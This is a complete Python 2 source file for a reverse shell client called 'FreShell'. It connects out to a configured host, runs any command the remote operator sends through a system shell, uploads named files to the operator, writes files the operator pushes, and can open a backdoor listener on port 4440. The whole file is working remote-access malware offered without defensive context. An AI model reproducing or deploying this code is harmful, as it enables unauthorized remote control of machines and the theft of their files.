import multiprocessing
import os
import socket
import subprocess
import sys

# FreShell Client - A simple Python Reverse Shell

host = '127.0.0.1'
port = 443

def connect():
    # Create socket & connect to server
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print "[-] Cannot create socket."
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] Cannot connect to server."

# Interactive Shell		(For Hidden, shell=False)
def command():
    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = cmd.stdout.read() + cmd.stderr.read()
    s.send(output)

# Upload File
def send_file():
    try:
        name_f = s.recv(1024)
    except socket.error:
        print "[-] Cannot recover file name."
    print "Sending File: ", name_f
    snd_f = open(name_f, "rb")
    read = snd_f.read()
    try:
        s.send(read)
    except socket.error:
        print "[-] Cannot send file data."

# Recover File
def recover_file():
    namef = s.recv(1024)
    word_l = namef.split("/")
    filename = word_l[-1]
    print "[+] Filename: ", filename
    try:
        data_f = s.recv(10000)
    except socket.error:
        print "[-] Cannot Recover File."
    rcv_f = open(filename, "wb")
    rcv_f.write(data_f)
    rcv_f.close()
    print "[+] Retrieved File"

# Create
def backdoor():
    bd_host = ''
    bd_port = 4440

    bds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bdb = bds.bind((bd_host, bd_port))
    bds.listen(1)
    print "Backdoor opened: Listening on port: ", bd_port
    bdcon, bdaddr = bds.accept()
    print "Server connected: ", bdaddr
    s.send("pwned")


def main():
    while True:
        try:
            global srv_cmd
            srv_cmd = s.recv(1024)
        except socket.error:
            print "Cannot recover command"
        split = srv_cmd.split(" ")
        cd = split[0]
        path = split[-1]
        if srv_cmd == "quit":
            print "[-] Interactive Mode Disabled"
        elif srv_cmd == "D1SC0NN3CT":
            print "[-] Disconnecting from server"
            s.close()
            exit()
        elif srv_cmd == "rcv_cli":
            send_file()
        elif srv_cmd == "snd_cli":
            recover_file()
        elif srv_cmd == "bd_me":
            p = multiprocessing.Process(target=backdoor)
            p.start()
            p.join()
        # Change Directory & Interactive Shell
        else:
            if cd == "cd":
                os.chdir(path)
                print "[+] New Directory: ", os.getcwd()
            else:
                command()
    s.close()

connect()
main()
